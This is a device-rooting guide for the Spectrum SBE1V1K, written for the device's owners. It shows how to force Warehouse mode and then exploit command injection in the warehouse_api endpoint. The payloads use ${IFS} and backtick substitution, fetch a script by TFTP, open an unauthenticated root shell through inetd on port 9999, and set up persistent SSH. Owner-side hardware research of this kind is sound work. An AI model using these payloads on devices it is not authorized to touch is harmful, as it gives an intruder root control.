# Spectrum SBE1V1K Non-Invasive Root Access and Recovery Guide

> This guide is for **maintenance, testing, recovery, and functional verification of devices you own or are explicitly authorized to administer**. It documents the process and mechanism for obtaining root-level administrative access. Do not use it on devices that you do not own or lack permission to manage.
>
> Key steps have been verified on hardware and cross-checked against the firmware. Relevant constraints are explained where they apply.

## Read This First

The procedure itself is straightforward, but the network topology and firmware branch must be correct:

1. Use a controllable upstream router to provide DHCP, IPv6, and the required DNS record to the SBE's **WAN port**, placing it in Warehouse mode.
2. Connect the maintenance computer to any **LAN port** on the SBE with a second Ethernet cable.
3. From that computer, confirm the mode and firmware version, then follow the matching branch in Step 4.
4. After access is obtained, close any temporary listener and retain only a restricted LAN-side management path.

Do not connect the upstream router's LAN port to an SBE LAN port. The correct topology is: **upstream-router LAN → SBE WAN; maintenance computer → SBE LAN**.

### Covered Versions and Validation Status

The **FW Version** shown by `/cgi-bin/index.cgi` comes from the runtime OVSDB field `AWLAN_Node.firmware_version`. The following versions are covered, with their validation status:

| FW Version shown on the page | Step 4 branch | Notes |
|---|---|---|
| `1.0.5` | 4A (older firmware) | Static image analysis only; port 22 may be started and reachable directly from LAN after the one-shot request, but this is not hardware-tested |
| `1.1.3.1` | 4B (newer firmware) | Some input handling was patched; use the two-stage TFTP workflow |


### Guide Map

- Step 1 configures the upstream test network so that the SBE WAN port enters Warehouse mode.
- Steps 2–3 connect from the LAN side and confirm that mode.
- Step 4 obtains temporary management access using the branch matching the firmware version.
- Steps 5–6 cover login, reducing exposure, and optional persistent management.
- Troubleshooting helps identify common network, mode, and connection issues.

## Prerequisites

- An SBE1V1K running **stock firmware** (`1.1.3.1` is hardware-tested; `1.0.5` has static image analysis only; the method also applies to the 1.0.x series)
- A controllable upstream router or test network (providing DHCP + IPv6 + custom DNS), with its **LAN port connected to the device's WAN port**
- A maintenance host connected to the device's **LAN port** (the web service only listens on the LAN bridge, see Step 2)
- Two Ethernet cables

## Overall Flow

```
Upstream-router LAN ──→ Device WAN port  (provides DHCP/IPv6/DNS, triggers Warehouse mode)
Maintenance computer ──→ Device LAN port (accesses the web interface, sends requests, SSH)

Power on → Warehouse mode → one HTTPS POST → SSH connection → root
```

⚠️ Both links are required:
- WAN only: the device enters Warehouse mode, but the web service is not reachable from the WAN side
- LAN only: the web service is reachable, but the device stays in Cloud mode and rejects everything except `get_mode`

---

## Step 1: Set Up the Test Network (WAN Port)

At boot, `modecheck.sh` requires the WAN port to obtain IPv4 (DHCP) and a global IPv6 address (SLAAC) simultaneously, and DNS must resolve `warehouse.ctdi.local`.

### Method A: OpenWrt Router

Reads the OpenWrt LAN IPv4 address automatically and keeps an existing ULA /48 if present. Backups go to /root on standard OpenWrt.

```bash
#!/bin/sh
ssh root@<openwrt-device-ip>
STAMP="$(date +%Y%m%d-%H%M%S)"
WAREHOUSE_IP="$(uci -q get network.lan.ipaddr)"
ULA_PREFIX="$(uci -q get network.globals.ula_prefix)"

# 1. Check LAN address
if [ -z "$WAREHOUSE_IP" ]; then
    echo "Error: cannot read network.lan.ipaddr"
    echo "Please confirm the LAN interface config is named lan:"
    echo "uci show network"
    exit 1
fi

# 2. Backup
cp /etc/config/network "/root/network.before_sbe_${STAMP}"
cp /etc/config/dhcp   "/root/dhcp.before_sbe_${STAMP}"

# 3. Remove old warehouse DNS mappings to avoid duplicates
for item in $(uci -q get dhcp.@dnsmasq[0].address); do
    case "$item" in
        /warehouse.ctdi.local/*|/warehouse.ctdi.com/*)
            uci -q del_list "dhcp.@dnsmasq[0].address=$item"
            ;;
    esac
done

# 4. Map DNS to the OpenWrt LAN address itself
uci add_list "dhcp.@dnsmasq[0].address=/warehouse.ctdi.local/${WAREHOUSE_IP}"
uci add_list "dhcp.@dnsmasq[0].address=/warehouse.ctdi.com/${WAREHOUSE_IP}"

# 5. Use the existing ULA /48; create a lab prefix if none exists
case "$ULA_PREFIX" in
    */48)
        echo "Keeping existing ULA: $ULA_PREFIX"
        ;;
    *)
        ULA_PREFIX='fd36:3600:100::/48'
        uci set network.globals='globals'
        uci set network.globals.ula_prefix="$ULA_PREFIX"
        echo "Set lab ULA: $ULA_PREFIX"
        ;;
esac

# 6. Critical: allow odhcpd to delegate prefixes downstream
uci set network.lan.ip6assign='60'

# 7. Enable RA, stateful DHCPv6, and default route advertisement
uci set dhcp.lan.ra='server'
uci set dhcp.lan.dhcpv6='server'
uci set dhcp.lan.ra_management='1'
uci set dhcp.lan.ra_default='1'

# 8. Save and apply
uci commit network
uci commit dhcp

/etc/init.d/network reload
/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart

echo "Configuration complete"
echo "LAN IPv4: $WAREHOUSE_IP"
echo "ULA prefix: $(uci -q get network.globals.ula_prefix)"
echo "Backup timestamp: $STAMP"
```

Verification:

```bash
uci get network.globals.ula_prefix
uci get network.lan.ip6assign
uci get dhcp.lan.ra_management

ubus call network.interface.lan status
ip -6 addr show dev br-lan

nslookup warehouse.ctdi.local "$(uci get network.lan.ipaddr)"
```

The ubus output should contain something like:

```json
"ipv6-prefix-assignment": [
    {
        "address": "fd36:3600:100::",
        "mask": 60
    }
]
```

### Method B: Xiaomi AX3600 Router

At every boot, the Xiaomi AX3600 firmware rebuilds `/etc/config/network` via `/etc/init.d/ipv6` (boot order `S58ipv6`), deleting manually added `network.globals` and `network.lan.ip6addr`, and resetting `network.lan.ip6assign` back to `64`.

There are therefore two ways to enable it:

- Temporary: effective immediately. As long as the Xiaomi does not reboot, the SBE can be rebooted repeatedly; if the Xiaomi reboots or loses power, the configuration is overwritten.
- Permanent: create a `S59sbe_lab_ipv6` boot service that restores the lab configuration automatically after the Xiaomi's stock `S58ipv6`.

#### Log In to the Xiaomi

On your computer:

```bash
ssh \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  root@192.168.31.1
```

---

#### B-1: Temporary Setup

The configuration below takes effect immediately, but must be re-applied after the Xiaomi reboots or loses power.

```bash
#!/bin/sh

STAMP="$(date +%Y%m%d-%H%M%S)"
WAREHOUSE_IP='192.168.31.1'
ULA_PREFIX='fd36:3600:100::/48'

# 1. Keep a fixed pre-lab backup; do not overwrite if it already exists
[ -e /data/network.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/network /data/network.before_sbe1v1k_ipv6

[ -e /data/dhcp.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/dhcp /data/dhcp.before_sbe1v1k_ipv6

# Also keep timestamped backups
cp /etc/config/network "/data/network.before_sbe_${STAMP}"
cp /etc/config/dhcp   "/data/dhcp.before_sbe_${STAMP}"

# 2. Remove existing warehouse DNS mappings to avoid duplicates
for item in $(uci -q get dhcp.@dnsmasq[0].address); do
    case "$item" in
        /warehouse.ctdi.local/*|/warehouse.ctdi.com/*)
            uci -q del_list "dhcp.@dnsmasq[0].address=$item"
            ;;
    esac
done

# 3. Add warehouse DNS mappings
uci add_list \
    "dhcp.@dnsmasq[0].address=/warehouse.ctdi.local/${WAREHOUSE_IP}"

uci add_list \
    "dhcp.@dnsmasq[0].address=/warehouse.ctdi.com/${WAREHOUSE_IP}"

# 4. Force-enable kernel IPv6 on the Xiaomi LAN side (critical fix;
#    without this step the SBE will never get IPv6)
#    When the Xiaomi's IPv6 mode is off (uci show ipv6 shows enabled='0'
#    mode='off'), network.lan.ipv6='0' remains in UCI. netifd then disables
#    IPv6 on br-lan at the kernel level (net.ipv6.conf.br-lan.disable_ipv6=1),
#    so none of the addresses below can be applied, and odhcpd refuses to send
#    RAs because br-lan has no public prefix. Observed symptom: all UCI
#    settings are correct, yet br-lan has no inet6 address at all and the SBE
#    gets no IPv6.
if [ "$(uci -q get network.lan.ipv6)" = "0" ]; then
    uci delete network.lan.ipv6
    echo "Removed network.lan.ipv6='0' (kernel IPv6 enabled)"
fi

# 5. Add the lab IPv6 address
# 2001:db8::/32 is for documentation and lab use only, never for public traffic
uci set network.lan.ip6addr='2001:db8:3600:1::1/64'

# 6. Create the local ULA /48 prefix pool
uci set network.globals='globals'
uci set network.globals.ula_prefix="$ULA_PREFIX"

# Critical: only with /60 on the LAN can odhcpd delegate IA_PD to the SBE
uci set network.lan.ip6assign='60'

# 7. Enable RA and stateful DHCPv6
uci set dhcp.lan.ra='server'
uci set dhcp.lan.dhcpv6='server'
uci set dhcp.lan.ra_management='1'
uci set dhcp.lan.ra_default='1'

# 8. Save
uci commit network
uci commit dhcp

# 9. Apply
/etc/init.d/network reload

# Belt and braces: make sure kernel IPv6 on br-lan is not disabled
# (after a normal reload this should read 0)
sysctl -w net.ipv6.conf.br-lan.disable_ipv6=0

/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart

echo "SBE lab IPv6 temporarily enabled"
echo "Backup timestamp: $STAMP"
echo "Re-run this script after the Xiaomi reboots"
```

After running it, keep the Xiaomi powered on and power-cycle the SBE (about 5 seconds off).

---

#### B-2: Permanent Setup

The permanent method creates `/etc/init.d/sbe_lab_ipv6`; enabling it creates `/etc/rc.d/S59sbe_lab_ipv6`. The boot order is:

```text
S58ipv6
    ↓
Xiaomi stock script rebuilds IPv6/network config
    ↓
S59sbe_lab_ipv6
    ↓
Restores the IPv6-PD config required by the SBE lab
```

Run the complete script below:

```bash
#!/bin/sh

STAMP="$(date +%Y%m%d-%H%M%S)"

# 1. Keep a fixed pre-lab backup; do not overwrite if it already exists
[ -e /data/network.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/network /data/network.before_sbe1v1k_ipv6

[ -e /data/dhcp.before_sbe1v1k_ipv6 ] || \
    cp /etc/config/dhcp /data/dhcp.before_sbe1v1k_ipv6

# Also keep timestamped backups
cp /etc/config/network "/data/network.before_sbe_${STAMP}"
cp /etc/config/dhcp   "/data/dhcp.before_sbe_${STAMP}"

# 2. Create the permanent boot service
cat > /etc/init.d/sbe_lab_ipv6 <<'EOF'
#!/bin/sh /etc/rc.common

START=59
STOP=10

WAREHOUSE_IP='192.168.31.1'
ULA_PREFIX='fd36:3600:100::/48'

start() {
    # Force-enable kernel IPv6 on the LAN side (critical fix)
    # When the Xiaomi IPv6 mode is off, network.lan.ipv6='0' remains in UCI
    # and netifd disables IPv6 on br-lan, so none of the addresses below work.
    if [ "$(uci -q get network.lan.ipv6)" = "0" ]; then
        uci delete network.lan.ipv6
        logger -t sbe_lab_ipv6 "removed network.lan.ipv6='0' (enable kernel IPv6)"
    fi

    # Remove existing warehouse DNS mappings to avoid duplicates
    for item in $(uci -q get dhcp.@dnsmasq[0].address); do
        case "$item" in
            /warehouse.ctdi.local/*|/warehouse.ctdi.com/*)
                uci -q del_list "dhcp.@dnsmasq[0].address=$item"
                ;;
        esac
    done

    # Add warehouse DNS mappings
    uci add_list \
        "dhcp.@dnsmasq[0].address=/warehouse.ctdi.local/${WAREHOUSE_IP}"

    uci add_list \
        "dhcp.@dnsmasq[0].address=/warehouse.ctdi.com/${WAREHOUSE_IP}"

    # Add the lab IPv6 address
    # 2001:db8::/32 is for lab use only, never for public traffic
    uci set network.lan.ip6addr='2001:db8:3600:1::1/64'

    # Create the ULA /48 prefix pool
    uci set network.globals='globals'
    uci set network.globals.ula_prefix="$ULA_PREFIX"

    # /60 on the LAN lets odhcpd delegate IA_PD to the SBE
    uci set network.lan.ip6assign='60'

    # Enable RA and stateful DHCPv6
    uci set dhcp.lan.ra='server'
    uci set dhcp.lan.dhcpv6='server'
    uci set dhcp.lan.ra_management='1'
    uci set dhcp.lan.ra_default='1'

    # Save
    uci commit network
    uci commit dhcp

    # netifd is already up (S20network); reload directly
    ubus call network reload

    # Wait for the network config to apply
    sleep 2

    # Belt and braces: make sure kernel IPv6 on br-lan is not disabled
    sysctl -w net.ipv6.conf.br-lan.disable_ipv6=0

    # Reload DNS and DHCPv6 services
    /etc/init.d/dnsmasq restart
    /etc/init.d/odhcpd restart

    logger -t sbe_lab_ipv6 \
        "SBE lab IPv6 configuration restored after Xiaomi S58ipv6"
}

stop() {
    # Stopping the service does not remove the current network config
    return 0
}
EOF

# 3. Make it executable
chmod 755 /etc/init.d/sbe_lab_ipv6

# 4. Enable permanently
/etc/init.d/sbe_lab_ipv6 enable

# 5. Run once immediately — no need to wait for the next reboot
/etc/init.d/sbe_lab_ipv6 start

echo "SBE lab IPv6 permanently enabled"
echo "Boot order: S58ipv6 -> S59sbe_lab_ipv6"
echo "Backup timestamp: $STAMP"
```

---

#### Check the Permanent Boot Service

```bash
ls -l /etc/init.d/sbe_lab_ipv6
ls -l /etc/rc.d/S59sbe_lab_ipv6
```

Expected:

```text
/etc/rc.d/S59sbe_lab_ipv6 -> ../init.d/sbe_lab_ipv6
```

---

#### Verify UCI Configuration

```bash
uci get network.globals.ula_prefix
uci get network.lan.ip6assign
uci get network.lan.ip6addr

uci get dhcp.lan.ra
uci get dhcp.lan.dhcpv6
uci get dhcp.lan.ra_management
uci get dhcp.lan.ra_default

# Critical: kernel IPv6 on the LAN side must be enabled
uci -q get network.lan.ipv6          # Expected: empty (no output)
sysctl net.ipv6.conf.br-lan.disable_ipv6    # Expected: 0
```

Expected output:

```yaml
fd36:3600:100::/48
60
2001:db8:3600:1::1/64
server
server
1
1

net.ipv6.conf.br-lan.disable_ipv6 = 0
```

> If `uci -q get network.lan.ipv6` outputs `0`, or the sysctl outputs `1`: the Xiaomi's IPv6 mode is off and `network.lan.ipv6='0'` makes netifd disable IPv6 on br-lan at the kernel level. None of the address settings above take effect, odhcpd refuses to send RAs, and the SBE gets no IPv6. Delete the option and reload the network (the B-1/B-2 scripts already include this fix).

#### Verify the Runtime IPv6 Prefix Pool

```bash
ubus call network.interface.lan status
```

The output should contain something like:

```json
"ipv6-prefix-assignment": [
    {
        "address": "fd36:3600:100::",
        "mask": 60,
        "local-address": {
            "address": "fd36:3600:100::1",
            "mask": 60
        }
    }
]
```

Check the `br-lan` addresses:

```bash
ip -6 addr show dev br-lan
```

Expected to include:

```text
inet6 fd36:3600:100::1/60 scope global
inet6 2001:db8:3600:1::1/64 scope global
```

#### Optional: Verify RA and DHCPv6

If the SBE remains in `Cloud` mode even though the UCI configuration looks correct, capture the IPv6 exchange on the Xiaomi to confirm that negotiation completes. Install `tcpdump` first if necessary:

```bash
tcpdump -ni br-lan -e -vv \
    'icmp6 or (udp port 546 or udp port 547)'
```

The normal sequence includes Router Solicitation / Advertisement and DHCPv6 Solicit, Advertise, Request, and Reply. Both `IA_NA` and `IA_PD` should appear in the Advertise and Reply. An `IA_PD` response of `NoPrefixAvail` means prefix delegation has not been configured successfully.

#### Verify Warehouse DNS

```bash
nslookup warehouse.ctdi.local 192.168.31.1
nslookup warehouse.ctdi.com 192.168.31.1
```

Both should resolve to `192.168.31.1`.

#### Verify SBE IPv6

After the SBE boots, on the Xiaomi run:

```bash
ip -6 neigh show dev br-lan
```

On success you should see the SBE's MAC and its global-scope IPv6 address (e.g. `fd36:3600:100::xxxx`).

---

#### After Testing: Restore the Xiaomi Configuration

If you used the **B-1 temporary setup**, restore the backups created by the first run of the script:

```bash
cp /data/network.before_sbe1v1k_ipv6 /etc/config/network
cp /data/dhcp.before_sbe1v1k_ipv6 /etc/config/dhcp

/etc/init.d/network reload
/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart
```

If you used the **B-2 permanent setup**, remove the boot service first, then restore the configuration:

```bash
/etc/init.d/sbe_lab_ipv6 disable 2>/dev/null
rm -f /etc/init.d/sbe_lab_ipv6

cp /data/network.before_sbe1v1k_ipv6 /etc/config/network
cp /data/dhcp.before_sbe1v1k_ipv6 /etc/config/dhcp

/etc/init.d/network reload
/etc/init.d/dnsmasq restart
/etc/init.d/odhcpd restart

test ! -e /etc/rc.d/S59sbe_lab_ipv6 && echo "boot hook removed"
```

Confirm that the backup files exist before restoring them. Do not overwrite the current network configuration if those backups are unavailable.

---

#### Important Notes

`2001:db8::/32` is a documentation-and-lab-only IPv6 range; it must never be used for public traffic.

The configuration that actually solves the SBE's IPv6 problem is:

```text
Kernel IPv6 enabled on the LAN side (network.lan.ipv6 ≠ '0' and disable_ipv6=0)
        +
ULA /48 prefix pool
        +
LAN ip6assign=60
        +
RA Managed flag
        +
DHCPv6 Server
        =
IA_NA + IA_PD
```

**The most common pitfall (verified in practice): when the Xiaomi's IPv6 mode is off** (`uci show ipv6` shows `enabled='0' mode='off'`), `network.lan.ipv6='0'` remains in UCI. Seeing that option, netifd sets `net.ipv6.conf.br-lan.disable_ipv6=1` at the kernel level — br-lan ends up with **no IPv6 addresses at all** (not even link-local), and odhcpd logs `A default route is present but there is no public prefix on br-lan thus we don't announce a default route!` and refuses to send RAs. The symptom: every UCI setting on the Xiaomi looks correct, yet the SBE gets no IPv6 and stays in Cloud mode. **Delete the `network.lan.ipv6` option before reloading** (the B-1/B-2 scripts include this check and fix).

Once the SBE obtains IA_NA and IA_PD, `br-wan` shows a `scope global` IPv6 address, and only then does `modecheck.sh` proceed with the warehouse DNS check and write `/tmp/router_mode`, whose success value is `Warehouse`.

---

## Step 2: Connect the Maintenance Host to the LAN Port

**Why LAN:** the `vm` daemon in the firmware calls `/sbin/restart_webservice.sh br-home`, and lighttpd only binds to the br-home (LAN bridge) IP; the WAN zone input is REJECT in `/etc/config/firewall`. The web interface is unreachable from the WAN side. **Both firmware generations behave identically here** — maintenance operations can only arrive from the LAN side.

- Connect the maintenance host to any **LAN port** of the SBE1V1K
- The device runs its own DHCP (pool 192.168.1.100-249); the host gets an address automatically
- The device IP is usually **192.168.1.1** (if different, check the default gateway the host received)
- If DHCP fails, configure 192.168.1.100/24 manually

Power on the SBE1V1K and wait 2-3 minutes for it to finish booting.

> Below, the address the maintenance host obtains on the br-home side (i.e. the 192.168.1.x address above) is referred to as `<maintenance-host-IP>`; replace it with the actual value in commands.

---

## Step 3: Verify Warehouse Mode

From the maintenance host:

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_mode'
```

Return values (identical across firmware generations):

| Return | Meaning | Action |
|---|---|---|
| `Warehouse` | Mode check passed, proceed | Go to Step 4 |
| `Cloud` | `modecheck.sh` failed | Re-check the test network (see below) |
| `INVALID_REQUEST` | Wrong method/body | Must be POST with a non-empty body |

At boot, `modecheck.sh` requires all three conditions below **simultaneously**; missing any one leaves the device in `Cloud`:

1. `br-wan` has IPv4 (DHCP);
2. `br-wan` has a **scope global** IPv6 address (SLAAC or DHCPv6, any source);
3. DNS can resolve `warehouse.ctdi.local` (busybox `nslookup` **queries the WAN-provided DNS directly**, bypassing the local dnsmasq, so the local rebind_protection does not affect the check).

⚠️ `modecheck.sh` **runs only once at boot** and writes the result to `/tmp/router_mode`; if that file does not exist, `get_mode` also returns `Cloud`. After changing the test network, **the SBE must be power-cycled** for a re-check.

---

## Step 4: Send the Firmware Upgrade Request

Check the firmware version first — **the two generations have different protections and require completely different request formats**:

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_current_firmware_version'
```

| | Old firmware 1.0.5 | New firmware 1.1.3.1 |
|---|---|---|
| `warehouse_api` character validation | None | Blocks `;` `$` `\|` `'` `"` (returns `INVALID_REQUEST_CHARACTER`) |
| Request shape | One-shot, `;` joins commands directly | Two-stage, backtick + TFTP-delivered script |
| Spaces in the `firmware` parameter | Not allowed (sscanf `%s` truncation), use `${IFS}` | Likewise not allowed |
| `tftpserver` with `:port` | Works | **Hangs permanently**, bare IP + port 69 only |
| Initial SSH state | **Port 22 may work directly** (image analysis only) | SSHM stops Dropbear, and the default LAN rules do not allow port 22 |
| How root is obtained | SSH is expected; password = serial in uppercase (see Step 5; not hardware-tested) | First open a temporary shell port ≥1024 through the request; configure restricted port 22 afterward |

---

### 4A. Old Firmware 1.0.5 (One-Shot Request)

> **Validation status: static image analysis only; not hardware-tested.** In this image, Dropbear defaults to TCP 22 and the LAN firewall accepts port 22. Therefore, after this step the device **may** permit direct LAN-side SSH without the temporary port-9999 shell. If a physical unit behaves differently, trust its runtime firewall and service state.

`warehouse_api` does not validate characters; `;` `$` backticks and pipes all work. One request joins commands directly:

```bash
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=127.0.0.1&firmware=x;/bin/rm${IFS}-f${IFS}/tmp/update_attempt_file${IFS}/tmp/update_firmware_id;/etc/init.d/dropbear${IFS}start;:'
```

Wait from a few seconds to a few minutes (see the timing note below), then verify:

```bash
# Image analysis indicates that port 22 may now be open (hardware verification required)
nc -z -v 192.168.1.1 22
```

If the port is open, continue with **Step 5 (SSH connection)**.

#### Payload, segment by segment

| Segment | Purpose |
|---|---|
| `command=update_firmware` | Triggers the firmware upgrade flow |
| `tftpserver=127.0.0.1` | Any IP works; 127.0.0.1 makes tftp fail fast (no real TFTP server needed) |
| `firmware=x;...` | `x` is a placeholder filename; everything after `;` is the appended command |
| `${IFS}` | **Stand-in for spaces** (reason below) |
| `/bin/rm -f ...` | Clears the upgrade attempt counters for repeated use |
| `/etc/init.d/dropbear start` | Starts the SSH service (the core goal) |
| Trailing `;:` | `:` is the shell no-op, used to swallow leftover appended arguments |

#### ⚠️ No spaces allowed in the payload (important)

One layer of the parameter path runs `sscanf("%[^/]/%s", host, path)` (libopensync.so). `%s` truncates at the first whitespace character — a space in the payload silently drops everything after it.

Workaround: use `${IFS}` instead of spaces. `${IFS}` is plain text (no whitespace) until it reaches the final `/bin/sh`, where it expands to space/tab and performs word splitting.

#### Timing note

The full command executed by `popen()` is:

```
timeout 300 tftp -g -r x;rm ...;dropbear start;: -l /tmp/firmware.img 127.0.0.1 69
```

The shell runs sequentially: `tftp` runs first and fails (no TFTP server on 127.0.0.1, usually within seconds, worst case 300 s), **only then** do the appended commands run. So SSH may not be available immediately after curl returns — wait and retry.

Also, `fw_utils`' retry loop runs the same payload multiple times per request (retries=3 → up to 4 executions); running `dropbear start` repeatedly is harmless.

---

### 4B. New Firmware 1.1.3.1 (Two-Stage Request)

**New protection:** `warehouse_api` validates the entire POST body before executing — `;` `$` `|` `'` `"` are all rejected (`INVALID_REQUEST_CHARACTER`), so the old `;` join + `${IFS}` approach **no longer works**.

**Allowed characters:** the validation lets backticks `` ` `` through, as well as `<` `>` `/` `{}` `()`, hence the new approach: **backtick command substitution + TFTP-delivered script**.

#### Character constraint reference

| Character | Usable | Notes |
|---|---|---|
| `` ` `` | ✅ | Command substitution — the core of the new approach |
| `<` `>` `/` `{}` `()` | ✅ | |
| `;` `$` `\|` `'` `"` | ❌ | Blocked by body validation |
| `&` | ❌ | POST parameter separator; truncates the `firmware` value |
| Space | ❌ | `sscanf %s` truncation; spaces cannot appear in the `firmware` parameter |

#### Critical `tftpserver` restriction

`tftpserver` **must not include `:port`** (e.g. `x.x.x.x:6969`), otherwise `fw_utils` hangs forever in `FWS:Working` (power-cycle required to recover). Use a **bare IP** only — the device always fetches from **port 69**, so the maintenance host must run a TFTP service on port 69 (requires root/administrator).

#### Two-stage request, how it works

The `firmware` parameter is written as (note: **no spaces**, **no blocked characters** in the whole value):

```
s.sh`sh</tmp/firmware.img`
```

`fw_utils` builds `tftp://<maintenance-host-IP>/s.sh`...`` and extracts PATH=`s.sh`sh</tmp/firmware.img``; `popen` actually executes:

```
timeout 300 tftp -g -r s.sh`sh</tmp/firmware.img` -l /tmp/firmware.img <maintenance-host-IP> 69
```

The shell first evaluates the backtick content `sh < /tmp/firmware.img` (command substitution), then runs tftp. Hence:

- **1st send**: `/tmp/firmware.img` does not exist yet, the backtick runs empty; tftp downloads `s.sh` and writes it to `/tmp/firmware.img`.
- **2nd send**: the backtick runs `sh < /tmp/firmware.img`, i.e. executes the script downloaded in step 1 **as root**.

So the **same payload must be sent twice**: first to deliver the script, then to trigger execution. The **contents of `s.sh` are not subject to any character restriction** (spaces, `&`, quotes all fine).

#### Procedure

**Step 1: Write the payload script `s.sh`.** Example: use busybox `inetd` to open a root shell on port 9999 (inetd config lives in writable `/tmp`; port ≥1024 matches the firewall allow rule):

```sh
#!/bin/sh
rm -f /tmp/update_attempt_file /tmp/update_firmware_id
printf '9999 stream tcp nowait root /bin/sh sh -i\n' > /tmp/inetd.conf
killall inetd 2>/dev/null
nohup /bin/busybox inetd /tmp/inetd.conf >/dev/null 2>&1 &
```

**Step 2: Run TFTP on the maintenance host (port 69).** Minimal implementation below supports both serving `s.sh` (RRQ) and receiving script uploads (WRQ); put `s.sh` in the same directory and run as root:

```python
#!/usr/bin/env python3
# Save as tftp_srv.py, same directory as s.sh; run with sudo python3 tftp_srv.py
import socket, struct, os
ROOT = '.'; RX = './tftp_rx'; os.makedirs(RX, exist_ok=True)
def rrq(peer, name):
    p = os.path.join(ROOT, os.path.basename(name))
    d = open(p,'rb').read() if os.path.isfile(p) else None
    t = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if d is None:
        t.sendto(struct.pack('!HH',5,1)+b'nf\x00', peer); t.close(); return
    blk = 1
    for i in range(0, len(d), 512):
        pkt = struct.pack('!HH',3,blk)+d[i:i+512]
        while True:
            t.sendto(pkt, peer); t.settimeout(3)
            try:
                a,_ = t.recvfrom(1024)
                if len(a) >= 4 and struct.unpack('!HH', a[:4]) == (4, blk): break
            except socket.timeout:
                continue
        blk += 1
    t.close()
def wrq(peer, name):
    p = os.path.join(RX, os.path.basename(name))
    t = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    t.sendto(struct.pack('!HH',4,0), peer)
    out = open(p,'wb'); exp = 1; t.settimeout(10)
    while True:
        try: pkt, ap = t.recvfrom(1024)
        except socket.timeout: break
        if len(pkt) < 4: continue
        op, blk = struct.unpack('!HH', pkt[:4])
        if op != 3: continue
        if blk == exp:
            out.write(pkt[4:]); t.sendto(struct.pack('!HH',4,blk), ap)
            if len(pkt) < 516: break
            exp += 1
        else:
            t.sendto(struct.pack('!HH',4,blk), ap)
    out.close(); t.close()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind(('0.0.0.0', 69))
print('TFTP on :69')
while True:
    d, peer = s.recvfrom(1024)
    if len(d) < 4: continue
    op = struct.unpack('!H', d[:2])[0]
    name = d[2:].split(b'\x00')[0].decode(errors='replace')
    if op == 1: rrq(peer, name)
    elif op == 2: wrq(peer, name)
```

**Step 3: Send the request (same payload, twice, about 8 s apart):**

```bash
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=<maintenance-host-IP>&firmware=s.sh`sh</tmp/firmware.img`'
sleep 8
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=<maintenance-host-IP>&firmware=s.sh`sh</tmp/firmware.img`'
```

**Step 4: Verify execution:**

```bash
nc -z 192.168.1.1 9999 && echo "shell port is open"
nc 192.168.1.1 9999        # enter the root shell; confirm uid=0 with id
```

#### 1.1.3.1: Temporary Root Entry and SSH Management

On `1.1.3.1`, the goal of 4B is to obtain one temporary root shell through port 9999; do not expect TCP 22 to be available at that point. Runtime logs show that SSHM runs `/etc/init.d/dropbear stop` during boot, and the default LAN rules do not allow port 22. Even if Dropbear is started manually, SSHM may restore that state. The vendor Dropbear also rejects both `root` and self-created usernames.

For stable SSH management, continue with Step 6. It uses the UID/GID-0 `operator` account and adds a TCP 22 rule limited to `br-home` (LAN) through `nfm_ip4tables.sh`. Do not replace this with a manual `iptables` rule: NFM removes rules that are not represented in its OVSDB state when it rebuilds the firewall. The shell, password state, and firewall state under `/tmp` are all lost on reboot.

#### Other Notes (verified pitfalls)

- **Put public keys in `/etc/dropbear/authorized_keys`**: that directory is bind-mounted to the persistent `/data/etc/dropbear` on p29. Log in as `operator`; `root` and self-created usernames are rejected by the vendor's Dropbear.
- **Do not flood stderr from the script**: write large output to a file and upload it with `tftp -p`, otherwise the popen pipe buffer fills up and the device hangs in `FWS:Working` forever.
- **Always clear the attempt counters first**: `rm -f /tmp/update_attempt_file /tmp/update_firmware_id`, to avoid silent failure once the per-boot quota is exhausted.
- **`tftpserver` must never include `:port`**, otherwise the device hangs and needs a power-cycle.

---

## Step 5: SSH Connection

According to the static analysis of the `1.0.5` image, Step 4A may start Dropbear on port 22 and the LAN side should be allowed. This has not been hardware-tested:

```bash
# root password = device serial number in UPPERCASE
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_serial'

ssh root@192.168.1.1
```

If SSH succeeds, root access has been obtained without opening the device.

### New Firmware 1.1.3.1

After completing the runtime manager in Step 6, log in to port 22 as `operator`. It has UID/GID 0 — equivalent to a root shell; do not use the `root` username. The old Dropbear RSA host key requires explicitly enabling the compatibility algorithm on the client:

```bash
ssh -p 22 -i <your-private-key-path> \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  operator@192.168.1.1
```

---

## Step 6 (Optional): Persistence

### Old Firmware 1.0.5

```bash
# Run after connecting over SSH
/etc/init.d/dropbear enable                      # start at boot
mkdir -p /etc/dropbear
echo "ssh-ed25519 AAAA...your public key..." > /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
```

### New Firmware 1.1.3.1: Persistent SSH on Port 22

The management identity verified on real hardware is `operator`, whose UID/GID are both 0 — after login you have root privileges. Do not use `root@device`: the vendor's Dropbear rejects that username before authentication, even when the root password or key is correct.

Verified runtime approach:

1. Place the RSA public key in `/etc/dropbear/authorized_keys`. This path is bind-mounted to `/data/etc/dropbear/authorized_keys` on p29, so the key survives reboots.
2. Put the management script on the writable, executable p35: `/usr/app/sbe_lab_mgmt.sh`.
3. The script disables and stops SSHM in `Node_Services`; otherwise its `always_restart=true` supervisor restarts it, and SSHM may modify the operator password and SSH state.
4. The script restores a fixed SHA-512 password hash for operator, configures Dropbear to listen on TCP 22, and writes a br-home-only TCP 22 OVSDB rule via `nfm_ip4tables.sh`.
